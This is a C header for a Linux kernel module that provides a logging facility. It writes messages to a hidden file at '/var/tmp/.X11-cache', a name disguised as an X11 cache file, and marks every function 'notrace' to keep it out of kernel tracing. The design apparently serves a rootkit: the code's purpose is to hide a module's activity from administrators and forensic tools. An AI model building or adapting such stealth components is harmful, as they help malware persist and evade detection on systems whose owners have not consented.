#ifndef SECURE_LOG_H
#define SECURE_LOG_H

#include "../include/headers.h"

#define HIDDEN_LOG_PATH "/var/tmp/.X11-cache"
#define LOG_BUFFER_SIZE 256

static DEFINE_MUTEX(log_mutex);

notrace static void write_to_hidden_log(const char *msg) {
    struct file *file;
    loff_t pos = 0;
    
    file = filp_open(HIDDEN_LOG_PATH, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (IS_ERR(file))
        return;
    
    kernel_write(file, msg, strlen(msg), &pos);
    filp_close(file, NULL);
}

notrace static void secure_log(const char *level, const char *symbol, const char *fmt, ...) {
    va_list args;
    char buffer[LOG_BUFFER_SIZE];
    int len;
    
    if (!mutex_trylock(&log_mutex))
        return;
    
    len = snprintf(buffer, sizeof(buffer) - 2, "%s [%s] ", symbol, level);
    
    va_start(args, fmt);
    len += vsnprintf(buffer + len, sizeof(buffer) - len - 2, fmt, args);
    va_end(args);
    
    if (len > 0 && len < sizeof(buffer) - 2) {
        buffer[len] = '\n';
        buffer[len + 1] = '\0';
        write_to_hidden_log(buffer);
    }
    
    mutex_unlock(&log_mutex);
}

#define TLOG_INF(fmt, ...)  secure_log("INFO", "✓", fmt, ##__VA_ARGS__)
#define TLOG_WARN(fmt, ...)  secure_log("WARN", "⚠", fmt, ##__VA_ARGS__)
#define TLOG_ERROR(fmt, ...) secure_log("ERROR", "✗", fmt, ##__VA_ARGS__)
#define TLOG_CRIT(fmt, ...)  secure_log("CRIT", "☠", fmt, ##__VA_ARGS__)

notrace static int init_secure_logging(void) {
    struct file *file;
    
    file = filp_open(HIDDEN_LOG_PATH, O_WRONLY | O_CREAT, 0600);
    if (IS_ERR(file))
        return PTR_ERR(file);
    
    filp_close(file, NULL);
    return 0;
}

#endif 

